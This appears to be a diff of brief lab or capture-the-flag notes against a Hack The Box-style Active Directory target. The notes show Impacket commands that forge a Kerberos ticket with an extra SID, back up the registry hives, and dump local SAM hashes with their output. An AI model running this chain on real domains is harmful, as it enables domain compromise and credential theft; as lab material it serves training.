@@ -1,0 +1,47 @@
+impacket-ticketer  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fa6 \                                                          
+  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
+  -domain darkzero.ext -user-id 1109 \
+  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
+  celia
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for darkzero.ext/celia
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncASRepPart
+[*] Saving ticket in celia.ccache
+
+
+
+get the ticket, as mentioned above RID 1603
+impacket-reg -k -no-pass -target-ip 172.16.20.1   darkzero.ext/celia@dc01.darkzero.htb backup -o 'C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts'       
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
+[*] Saved HKLM\SAM to C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts\SAM.save
+[*] Saved HKLM\SYSTEM to C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts\SYSTEM.save
+[*] Saved HKLM\SECURITY to C:\Windows\SYSVOL\sysvol\darkzero.htb\scripts\SECURITY.save
+
+
+
+use impacket-reg to backup
+impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save local                                                                   
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xd7104de0ccfc39117fa0498a3dfbd8a3
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b.
+.
+.
+.
+20f72bd9a28caf71f2e0d209a1ec09ebde9b8cf54ae62d6b1d3216a2edb4aef151ae5b41e54eb6
+[*] Cleaning up...
